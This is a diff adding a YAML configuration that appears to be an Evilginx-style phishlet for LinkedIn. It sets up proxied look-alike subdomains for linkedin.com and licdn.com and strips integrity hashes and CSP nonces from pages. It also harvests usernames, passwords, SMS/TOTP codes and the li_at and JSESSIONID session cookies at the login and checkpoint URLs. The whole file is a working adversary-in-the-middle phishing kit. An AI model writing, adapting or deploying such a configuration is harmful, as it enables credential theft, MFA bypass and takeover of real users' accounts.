@@ -1,0 +1,58 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  # Main LinkedIn — login and feed
+  - {phish_sub: 'linkedin', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true, auto_filter: true}
+  # Static CDN — JS/CSS bundles served from licdn.com
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'licdn.com', session: false, is_landing: false, auto_filter: true}
+  # Media CDN — profile images, thumbnails
+  - {phish_sub: 'media', orig_sub: 'media', domain: 'licdn.com', session: false, is_landing: false, auto_filter: false}
+  # Tracking / analytics sub used by auth redirects
+  - {phish_sub: 'px', orig_sub: 'px', domain: 'linkedin.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  # Strip SRI integrity hashes
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Strip CSP nonce attributes
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Rewrite all linkedin.com origin references
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Rewrite licdn.com CDN references that appear in main page
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'static', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'media', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.linkedin.com'
+    keys: ['li_at', 'JSESSIONID,opt', 'liap,opt', 'li_mc,opt', 'li_rm,opt', 'bcookie,opt', 'bscookie,opt', 'lidc,opt', 'li_gc,opt', 'lang,opt', 'li_sugr,opt']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # SMS / TOTP verification code
+    - {key: 'pin', search: '(.*)', type: 'post'}
+    # Alternative username field (some LinkedIn flows)
+    - {key: 'loginCsrfParam', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/checkpoint/lg/login-submit'
+  - '/uas/authenticate'
+  - '/feed'
+  - '/in/.*'
+  - '/checkpoint/challenge/.*'
+
+login:
+  domain: 'www.linkedin.com'
+  path: '/login'
